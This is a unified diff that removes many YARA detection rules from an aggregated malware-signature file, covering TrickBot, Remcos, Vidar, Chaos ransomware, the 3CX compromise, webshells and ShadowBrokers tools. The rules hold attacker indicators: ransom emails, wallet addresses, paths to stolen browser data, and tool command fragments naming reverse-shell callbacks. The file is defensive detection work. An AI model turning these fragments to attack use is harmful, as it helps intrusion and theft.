-    license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
-    logic_hash  = "62bd3717af8970f67f28d923ce2483ff55a5ef4585a183d4d510e3a2c45fcc8c"
-    score       = 75
-    quality     = 80
-    tags        = ""
-    rule_usage  = "memory scan"
-
-  strings:
-    $sqlite3step = { 68 34 1c 7b e1 }
-    $sqlite3text = { 68 38 2a 90 c5 }
-    $sqlite3blob = { 68 53 d8 7f 8c }
-
-  condition:
-    all of them
-}
-
-rule JPCERTCC_Trickbot {
-  meta:
-    description = "detect TrickBot in memory"
-    author      = "JPCERT/CC Incident Response Group"
-    id          = "1a3c5193-bea1-5f64-be40-47bd22c09772"
-    date        = "2021-08-16"
-    modified    = "2021-08-16"
-    reference   = "https://github.com/JPCERTCC/MalConfScan/"
-    source_url  = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L458-L478"
-    license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
-    logic_hash  = "b0c3437bc4b4f9e7b2a1562e2d514b7aad398d5e387bb79829757b5772a1ebc3"
-    score       = 75
-    quality     = 80
-    tags        = ""
-    rule_usage  = "memory scan"
-    hash1       = "2153be5c6f73f4816d90809febf4122a7b065cbfddaa4e2bf5935277341af34c"
-
-  strings:
-    $tagm1   = "<mcconf><ver>" wide
-    $tagm2   = "</autorun></mcconf>" wide
-    $tagc1   = "<moduleconfig><autostart>" wide
-    $tagc2   = "</autoconf></moduleconfig>" wide
-    $tagi1   = "<igroup><dinj>" wide
-    $tagi2   = "</dinj></igroup>" wide
-    $tags1   = "<servconf><expir>" wide
-    $tags2   = "</plugins></servconf>" wide
-    $tagl1   = "<slist><sinj>" wide
-    $tagl2   = "</sinj></slist>" wide
-    $dllname = { 6C 00 00 00 CC 00 00 00 19 01 00 00 00 00 00 00 1A 01 }
-
-  condition:
-    all of ($tagm*) or all of ($tagc*) or all of ($tagi*) or all of ($tags*) or all of ($tagl*) or $dllname
-}
-
-rule JPCERTCC_Remcos_1 {
-  meta:
-    description = "detect Remcos in memory"
-    author      = "JPCERT/CC Incident Response Group"
-    id          = "4a27a16a-2669-5009-bc82-082ec0c9b2c1"
-    date        = "2021-08-16"
-    modified    = "2021-08-16"
-    reference   = "https://github.com/JPCERTCC/MalConfScan/"
-    source_url  = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L480-L493"
-    license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
-    logic_hash  = "1b4b9f7a88f33faeda71ea9a354eeccba8889800f48a6280c4ec533bb1b3ef3d"
-    score       = 75
-    quality     = 80
-    tags        = ""
-    rule_usage  = "memory scan"
-    hash1       = "7d5efb7e8b8947e5fe1fa12843a2faa0ebdfd7137582e5925a0b9c6a9350b0a5"
-
-  strings:
-    $remcos   = "Remcos" ascii fullword
-    $url1     = "Breaking-Security.Net" ascii fullword
-    $url2     = "BreakingSecurity.Net" ascii fullword
-    $resource = "SETTINGS" ascii wide fullword
-
-  condition:
-    1 of ($url*) and $remcos and $resource
-}
-
 rule JPCERTCC_Elf_Plead {
   meta:
     description = "ELF_PLEAD"
@@ -24344,35 +21917,6 @@ rule SECUINFRA_MAL_WSHRAT: RAT JAVASCRIPT WSHRAT FILE {
 
   condition:
     filesize < 2MB and 2 of ($cmd*) and 12 of ($function*)
-}
-
-rule RUSSIANPANDA_Vidar_DLL_Embedded {
-  meta:
-    description = "Vidar Stealer with embedded DLL dependencies"
-    author      = "RussianPanda"
-    id          = "462fe42a-2504-5e7e-ad90-2c7e54478204"
-    date        = "2023-05-02"
-    modified    = "2023-05-05"
-    reference   = "https://github.com/RussianPanda95/Yara-Rules"
-    source_url  = "https://github.com/RussianPanda95/Yara-Rules/blob/c65f3c62711bf141e4eb926ffe3a9880e5331974/VidarStealer/vidar_ver3.6_3.7_dll_embedded.yar#L1-L21"
-    license_url = "N/A"
-    logic_hash  = "98d23523c2ab196f670dc33164954fc69a1c1692fa870a476e25d7dd3cebace2"
-    score       = 75
-    quality     = 85
-    tags        = ""
-
-  strings:
-    $s  = { 50 4B 03 04 14 00 00 00 08 00 24 56 25 55 2B 6D 5C 08 39 7C 05 }
-    $a1 = "https://t.me/mastersbots"
-    $a2 = "https://steamcommunity.com/profiles/76561199501059503"
-    $a3 = "%s\\%s\\Local Storage\\leveldb"
-    $a4 = "\\Autofill\\%s_%s.txt"
-    $a5 = "\\Downloads\\%s_%s.txt"
-    $a6 = "\\CC\\%s_%s.txt"
-    $a7 = "Exodus\\exodus.wallet"
-
-  condition:
-    $s and 5 of ($a*)
 }
 
 rule RUSSIANPANDA_PSWSTEALER: FILE {
@@ -26059,37 +23603,6 @@ rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Diavol {
     any of them
 }
 
-rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Chaos {
-  meta:
-    description = "Detects files referencing identities associated with Chaos ransomware"
-    author      = "ditekShen"
-    id          = "18476655-1468-569e-b518-ebeaf289fbd6"
-    date        = "2024-01-23"
-    modified    = "2024-01-23"
-    reference   = "https://github.com/ditekshen/detection"
-    source_url  = "https://github.com/ditekshen/detection/blob/2ddbbe14eea1f342bca2cfd09a643a40ae2fcaf6/yara/indicator_knownbad_id.yar#L493-L511"
-    license_url = "https://github.com/ditekshen/detection/blob/2ddbbe14eea1f342bca2cfd09a643a40ae2fcaf6/LICENSE.txt"
-    logic_hash  = "6e8dce1622dbccca6aa15040b49fc9ea05ec7192f8a79409fd7414690102d09a"
-    score       = 75
-    quality     = 67
-    tags        = ""
-
-  strings:
-    $s1  = "anenomous31@gmail.com" ascii wide nocase
-    $s2  = "daengsocietyteam@gmail.com" ascii wide nocase
-    $s3  = "RansHelp@tutanota.com" ascii wide nocase
-    $s4  = "18vhBpgPhZrjJkbuT2ZyUXAnJavaJcTwEd" ascii wide
-    $s5  = "bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0" ascii wide
-    $s6  = "8AFtPnreZp28xoetUyKiQvVtwrov9PtEbMyvczdNZpBN45EUbEsrE8xYVp4NNqPrtxNjQwn3PbW3FG16EPYcPpKzMU78xN6" ascii wide
-    $s7  = "bc1qu6tharwawwny28z9fj6nrxg5cqftaep9ap6z2v" ascii wide
-    $s8  = "bambolina2021@virgilio.it" ascii wide nocase
-    $s9  = "1EoyuvcXdAQQvStkoJZ38vdGm84StD7wjm" ascii wide
-    $s10 = "1G395PJs8ciqvXPZEYb1LfUGPix9h9n3oQ" ascii wide
-
-  condition:
-    any of them
-}
-
 rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Maze {
   meta:
     description = "Detects files referencing identities associated with Maze ransomware"
@@ -26377,39 +23890,6 @@ rule HARFANGLAB_Masepie_Campaign_Htmlstarter: FILE {
     filesize > 600 and filesize < 5KB and (all of them)
 }
 
-rule HARFANGLAB_Allasenhamaycampaign_Allasenha {
-  meta:
-    description = "Detects AllaSenha banking trojan DLLs."
-    author      = "HarfangLab"
-    id          = "787c4e66-2053-5f14-a52e-6b0415700e8c"
-    date        = "2024-05-28"
-    modified    = "2024-05-28"
-    reference   = "TRR240501"
-    source_url  = "https://github.com/HarfangLab/iocs/blob/f679751df7994790f9f79629d60b3f2623148255/TRR240501/trr240501_yara.yar#L21-L43"
-    license_url = "N/A"
-    logic_hash  = "affe75ade6c8d9eeba00006f78678a48b1cfc5ffa9f9675fdea6ffd6cb3a02bd"
-    score       = 75
-    quality     = 80
-    tags        = ""
-    context     = "file,memory"
-
-  strings:
-    $a1  = "<|NOSenha|>" wide fullword
-    $a2  = "<|SENHA|>QrCode: " wide fullword
-    $a3  = "<|SENHA|>Senha 6 : " wide fullword
-    $a4  = "<|SENHA|>Snh: " wide fullword
-    $a5  = "<|SENHA|>Token: " wide fullword
-    $a6  = "<|BB-AMARELO|>" wide fullword
-    $a7  = "<|BB-AZUL|>" wide fullword
-    $a8  = "<|BB-PROCURADOR|>" wide fullword
-    $a9  = "<|ITAU-SNH-CARTAO|>" wide fullword
-    $a10 = "<|ITAU-TK-APP|>" wide fullword
-    $dga = { 76 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 78 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 7A 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 77 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 6B 00 00 00 B0 04 02 00 FF FF FF FF 01 00 00 00 79 00 00 00 }
-
-  condition:
-    $dga and (4 of ($a*))
-}
-
 rule SIGNATURE_BASE_MAL_Sednit_Delphidownloader_Apr18_2: FILE {
   meta:
     description = "Detects malware from Sednit Delphi Downloader report"
@@ -26556,35 +24036,6 @@ rule SIGNATURE_BASE_Malware_Apt15_Generic {
 
   condition:
     2 of them
-}
-
-rule SIGNATURE_BASE_MAL_ZIP_Socgholish_Mar21_1: ZIP JS SOCGHOLISH FILE {
-  meta:
-    description = "Triggers on small zip files with typical SocGholish JS files in it"
-    author      = "Nils Kuhnert"
-    id          = "da35eefd-b34d-59cd-8afc-da9c78ace96e"
-    date        = "2021-03-29"
-    modified    = "2023-12-05"
-    reference   = "https://github.com/Neo23x0/signature-base"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/crime_socgholish.yar#L1-L22"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    hash        = "4f6566c145be5046b6be6a43c64d0acae38cada5eb49b2f73135b3ac3d6ba770"
-    hash        = "54f756fbf8c20c76af7c9f538ff861690800c622d1c9db26eb3afedc50835b09"
-    hash        = "dfdbec1846b74238ba3cfb8c7580c64a0fa8b14b6ed2b0e0e951cc6a9202dd8d"
-    logic_hash  = "6621b029f65720e468bd167fcd7429a1f7ba8975298ddbd913b13fbe9e117df2"
-    score       = 75
-    quality     = 60
-    tags        = "ZIP, JS, SOCGHOLISH, FILE"
-
-  strings:
-    $a1 = /\.[a-z0-9]{6}\.js/ ascii
-    $a2 = "Chrome" ascii
-    $a3 = "Opera" ascii
-    $b1 = "Firefox.js" ascii
-    $b2 = "Edge.js" ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 1600 and (2 of ($a*) or any of ($b*))
 }
 
 rule SIGNATURE_BASE_EXT_MAL_JS_Socgholish_Mar21_1: JS SOCGHOLISH FILE {
@@ -27129,34 +24580,6 @@ rule SIGNATURE_BASE_HKTL_Natbypass_Dec22_1: T1090 FILE {
 
   condition:
     filesize < 8000KB and (1 of ($x*) or 2 of them) or 3 of them
-}
-
-rule SIGNATURE_BASE_APT_MAL_NK_3CX_Malicious_Samples_Mar23_3 {
-  meta:
-    description = "Detects malicious DLLs related to 3CX compromise (decrypted payload)"
-    author      = "Florian Roth , X__Junior (Nextron Systems)"
-    id          = "d2d361b6-8485-57eb-b6eb-88785f42e93e"
-    date        = "2023-03-29"
-    modified    = "2023-12-05"
-    reference   = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/gen_mal_3cx_compromise_mar23.yar#L56-L79"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "adfe04904d796690631e5841ee1ee10c767f9f4c340e5b9df78918e981359d4d"
-    score       = 80
-    quality     = 85
-    tags        = ""
-    hash1       = "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973"
-
-  strings:
-    $opa1 = { 41 81 C0 ?? ?? ?? ?? 02 C8 49 C1 E9 ?? 41 88 4B ?? 4D 03 D1 8B C8 45 8B CA C1 E1 ?? 33 C1 41 69 D0 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 81 C2 ?? ?? ?? ?? 33 C1 43 8D 0C 02 02 C8 49 C1 EA ?? 41 88 0B 8B C8 C1 E1 ?? 33 C1 44 69 C2 ?? ?? ?? ?? 8B C8 C1 E9 ?? 33 C1 8B C8 C1 E1 ?? 41 81 C0 }
-    $opa2 = { 8B C8 41 69 D1 ?? ?? ?? ?? C1 E1 ?? 33 C1 45 8B CA 8B C8 C1 E9 ?? 33 C1 81 C2 ?? ?? ?? ?? 8B C8 C1 E1 ?? 33 C1 41 8B C8 4C 0F AF CF 44 69 C2 ?? ?? ?? ?? 4C 03 C9 45 8B D1 4C 0F AF D7 }
-    $opb1 = { 45 33 C9 48 89 6C 24 ?? 48 8D 44 24 ?? 48 89 6C 24 ?? 8B D3 48 89 B4 24 ?? ?? ?? ?? 48 89 44 24 ?? 45 8D 41 ?? FF 15 }
-    $opb2 = { 44 8B 0F 45 8B C6 48 8B 4D ?? 49 8B D7 44 89 64 24 ?? 48 89 7C 24 ?? 44 89 4C 24 ?? 4C 8D 4D ?? 48 89 44 24 ?? 44 89 64 24 ?? 4C 89 64 24 ?? FF 15 }
-    $opb3 = { 48 FF C2 66 44 39 2C 56 75 ?? 4C 8D 4C 24 ?? 45 33 C0 48 8B CE FF 15 ?? ?? ?? ?? 85 C0 0F 84 ?? ?? ?? ?? 44 0F B7 44 24 ?? 33 F6 48 8B 54 24 ?? 45 33 C9 48 8B 0B 48 89 74 24 ?? 89 74 24 ?? C7 44 24 ?? ?? ?? ?? ?? 48 89 74 24 ?? FF 15 }
-    $opb4 = { 33 C0 48 8D 6B ?? 4C 8D 4C 24 ?? 89 44 24 ?? BA ?? ?? ?? ?? 48 89 44 24 ?? 48 8B CD 89 44 24 ?? 44 8D 40 ?? 8B F8 FF 15 }
-
-  condition:
-    (all of ($opa*)) or (1 of ($opa*) and 1 of ($opb*)) or (3 of ($opb*))
 }
 
 rule SIGNATURE_BASE_APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_3 {
@@ -28026,34 +25449,6 @@ rule SIGNATURE_BASE_WEB_INF_Web: FILE {
     filesize < 1KB and all of them
 }
 
-rule SIGNATURE_BASE_Jsp_Cmd: FILE {
-  meta:
-    description = "Laudanum Injector Tools - file cmd.war"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "74db62b8-82d5-5a34-aa72-2f85053715a4"
-    date        = "2015-06-22"
-    modified    = "2023-12-05"
-    reference   = "http://laudanum.inguardians.com/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_laudanum_webshells.yar#L209-L226"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    hash        = "55e4c3dc00cfab7ac16e7cfb53c11b0c01c16d3d"
-    logic_hash  = "ab5b013a385549322bcb2811fa1a2d14b5633e2c41b9486b1e1c50c02437b8e6"
-    score       = 75
-    quality     = 85
-    tags        = "FILE"
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-
-  strings:
-    $s0 = "cmd.jsp}" fullword ascii
-    $s1 = "cmd.jspPK" fullword ascii
-    $s2 = "WEB-INF/web.xml" fullword ascii
-    $s3 = "WEB-INF/web.xmlPK" fullword ascii
-    $s4 = "META-INF/MANIFEST.MF" fullword ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 2KB and all of them
-}
-
 rule SIGNATURE_BASE_RAT_Qrat {
   meta:
     description = "Detects QRAT"
@@ -28080,29 +25475,6 @@ rule SIGNATURE_BASE_RAT_Qrat {
 
   condition:
     4 of them
-}
-
-rule SIGNATURE_BASE_MAL_JRAT_Oct18_1: FILE {
-  meta:
-    description = "Detects JRAT malware"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "f211ef1c-8def-55f0-8817-d01ebd9c2947"
-    date        = "2018-10-11"
-    modified    = "2023-12-05"
-    reference   = "Internal Research"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/gen_rats_malwareconfig.yar#L1060-L1072"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "7c652f3943ae7639633b82663f639adb7dea1bae9e617a14710fb6e448cfdbee"
-    score       = 75
-    quality     = 85
-    tags        = "FILE"
-    hash1       = "ce190c37a6fdb2632f4bc5ea0bb613b3fbe697d04e68e126b41910a6831d3411"
-
-  strings:
-    $x1 = "/JRat.class" ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 700KB and 1 of them
 }
 
 rule SIGNATURE_BASE_Irontiger_Aspxspy: HIGHVOL {
@@ -28888,31 +26260,6 @@ rule SIGNATURE_BASE_CN_Hacktool_Ssport_Portscanner {
     all of them
 }
 
-rule SIGNATURE_BASE_Bypassuac2 {
-  meta:
-    description = "Auto-generated rule - file BypassUac2.zip"
-    author      = "yarGen Yara Rule Generator"
-    id          = "8b7e49de-9b0a-5dc4-86af-1a854dc649cc"
-    date        = "2023-12-05"
-    modified    = "2023-12-05"
-    reference   = "https://github.com/Neo23x0/signature-base"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/thor-hacktools.yar#L955-L967"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    hash        = "ef3e7dd2d1384ecec1a37254303959a43695df61"
-    logic_hash  = "398783fa0453a60fd1c6aa64eacfbfa7c5385e81c79d1b6a8a8386dae9b825cc"
-    score       = 75
-    quality     = 85
-    tags        = ""
-
-  strings:
-    $s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
-    $s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
-    $s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
-
-  condition:
-    all of them
-}
-
 rule SIGNATURE_BASE_Vubrute_Config {
   meta:
     description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
@@ -28941,30 +26288,6 @@ rule SIGNATURE_BASE_Vubrute_Config {
 
   condition:
     all of them
-}
-
-rule SIGNATURE_BASE_Darkcomet_Keylogger_File: FILE {
-  meta:
-    description = "Looks like a keylogger file created by DarkComet Malware"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "65058450-3ae3-5b85-bcc5-8bc1fab14614"
-    date        = "2014-07-25"
-    modified    = "2023-12-05"
-    reference   = "https://github.com/Neo23x0/signature-base"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/thor-hacktools.yar#L3049-L3063"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "28f2eb8f5082559f9de4e72243f4bf8a0be21a9a4c5e16c443d036733584ea97"
-    score       = 50
-    quality     = 35
-    tags        = "FILE"
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-
-  strings:
-    $entry     = /\n:: [A-Z]/
-    $timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/
-
-  condition:
-    uint16(0) == 0x3A3A and #entry > 10 and #timestamp > 10
 }
 
 rule SIGNATURE_BASE_Netview_Hacktool_Output {
@@ -29747,30 +27070,6 @@ rule SIGNATURE_BASE_Tofu_Backdoor {
     $a or $b or $c
 }
 
-rule SIGNATURE_BASE_MAL_Burningumbrella_Sample_11: FILE {
-  meta:
-    description = "Detects malware sample from Burning Umbrella report"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "9762c68c-4d69-5d38-aaf4-0048e7404147"
-    date        = "2018-05-04"
-    modified    = "2023-12-05"
-    reference   = "https://401trg.pw/burning-umbrella/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_winnti_burning_umbrella.yar#L165-L178"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "847681b3e9d4fc38c483663f5a7e16e7f8f95cfa77728d7316edbe6fbf5fe2c1"
-    score       = 75
-    quality     = 85
-    tags        = "FILE"
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "278e9d130678615d0fee4d7dd432f0dda6d52b0719649ee58cbdca097e997c3f"
-
-  strings:
-    $s1 = "Resume.app/Contents/Java/Resume.jarPK" fullword ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 700KB and 1 of them
-}
-
 rule SIGNATURE_BASE_CN_Honker_Webshell_Cfm_Xl: FILE {
   meta:
     description = "Webshell from CN Honker Pentest Toolset - file xl.cfm"
@@ -30333,414 +27632,6 @@ rule SIGNATURE_BASE_CN_Honker_Webshell_Webshell: FILE {
 
   condition:
     filesize < 30KB and 2 of them
-}
-
-rule SIGNATURE_BASE_Kerberoast_PY {
-  meta:
-    description = "Auto-generated rule - file kerberoast.py"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "cea6cdb2-cd1a-5701-a9d1-27c788a962a7"
-    date        = "2016-05-21"
-    modified    = "2023-12-05"
-    reference   = "https://github.com/skelsec/PyKerberoast"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/gen_kerberoast.yar#L43-L59"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "3b285cc55733bd4c499ffb4821a92675806bf66faf3b3565ffb6de867bed538d"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "73155949b4344db2ae511ec8cab85da1ccbf2dfec3607fb9acdc281357cdf380"
-
-  strings:
-    $s1 = "newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)" fullword ascii
-    $s2 = "key = kerberos.ntlmhash(args.password)" fullword ascii
-    $s3 = "help='the password used to decrypt/encrypt the ticket')" fullword ascii
-    $s4 = "newencserverticket = kerberos.encrypt(key, 2, e, nonce)" fullword ascii
-
-  condition:
-    2 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Violetspirit {
-  meta:
-    description = "Auto-generated rule - file violetspirit.README"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "4efea734-8cbc-53f7-bf92-5b3253721a81"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L73-L86"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "01a45feb5c9f9cfe8834306993c53b1e53d79b89b07106ffec0c81cdebb8b71c"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
-
-  strings:
-    $x1 = "-i tgt_ipaddr -h tgt_hostname" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Gr_Gr {
-  meta:
-    description = "Auto-generated rule - file gr.notes"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "c233159d-8d78-575b-b32b-21f704debfe2"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L88-L101"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "facce45a335d7ca799d68fc26ee2bf5682cec0914502482189cd6aa496cba489"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "b2b60dce7a4cfdddbd3d3f1825f1885728956bae009de3a307342fbdeeafcb79"
-
-  strings:
-    $s4 = "delete starting from: (root) LIST (root)" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Yellowspirit {
-  meta:
-    description = "Auto-generated rule - file user.tool.yellowspirit.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "b1ca04e5-bac7-5247-b2d4-82c3515c92fc"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L103-L117"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "698b23cc4cc6f319ddef7a93cf7ddc83ffae1d2c2b0a9545011b51e381f8cd0c"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "a7c4b718fa92934a9182567288146ffa3312d9f3edc3872478c90e0e2814078c"
-
-  strings:
-    $s1 = "-l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999" fullword ascii
-    $s2 = "-s PITCH_IP -x PITCH_IP -y RHP-24 TARGET_IP" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_Eleganteagle_Opscript_1_0_0 {
-  meta:
-    description = "Auto-generated rule - file eleganteagle_opscript.1.0.0.6"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "22855519-160c-57cf-b610-a611ca6813ed"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L119-L132"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "3df5ba1a497ffe5306ed7966f25f69c30a5191e935c5638869a62b3cb2324f70"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "57e223318de0a802874642652b3dc766128f25d7e8f320c6f04c6f2659bb4f7f"
-
-  strings:
-    $x3 = "uploadnrun -e \"D=-ucIP_ADDRESS_OF_REDIR" ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Epichero {
-  meta:
-    description = "Auto-generated rule - file user.tool.epichero.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "b1ca04e5-bac7-5247-b2d4-82c3515c92fc"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L164-L178"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
-    logic_hash  = "36dc38f2dd630f22b87e8d9130de7d40ee3cdba45597b2b667a1a9536d990aad"
-    score       = 75
-    quality     = 85
-    tags        = ""
-    license     = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-    hash1       = "679d194c32cbaead7281df9afd17bca536ee9d28df917b422083ae8ed5b5c484"
-
-  strings:
-    $x2 = "-irtun TARGET_IP ISH_CALLBACK_PORT"
-    $x3 = "-O REVERSE_SHELL_CALLBACK_PORT -w HIDDEN_DIR" fullword ascii
-
-  condition:
-    1 of them
-}
-
-rule SIGNATURE_BASE_FVEY_Shadowbroker_User_Tool_Dubmoat {
-  meta:
-    description = "Auto-generated rule - file user.tool.dubmoat.COMMON"
-    author      = "Florian Roth (Nextron Systems)"
-    id          = "d6c0a00b-dda9-587f-a867-f3b632edd494"
-    date        = "2016-12-17"
-    modified    = "2023-12-05"
-    reference   = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
-    source_url  = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/yara/apt_fvey_shadowbroker_dec16.yar#L195-L209"
-    license_url = "https://github.com/Neo23x0/signature-base/blob/6b8e2a00e5aafcfcfc767f3f53ae986cf81f968a/LICENSE"
